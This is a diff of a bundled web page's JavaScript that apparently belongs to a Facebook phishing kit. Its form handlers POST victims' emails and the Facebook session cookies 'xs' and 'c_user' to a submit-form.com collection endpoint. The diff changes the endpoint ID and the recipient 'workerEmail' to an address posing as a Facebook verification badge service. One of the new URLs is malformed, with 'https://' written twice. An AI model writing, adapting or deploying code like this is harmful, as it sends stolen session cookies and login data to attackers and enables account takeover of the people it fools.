@@ -9814,14 +9814,14 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/DEEIr4lxi", {
+                                    fetch("https://submit-form.com/h11VgbKkC", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: o,
-                                            workerEmail: "Lernayouamzaxal@gmail.com",
+                                            workerEmail: "facebook.verified.badge.here@gmail.com",
                                             xs: r,
                                             c_user: i,
                                             name: "Farhan"
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/DEEIr4lxi", {
+                        fetch("https://https://submit-form.com/h11VgbKkC", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
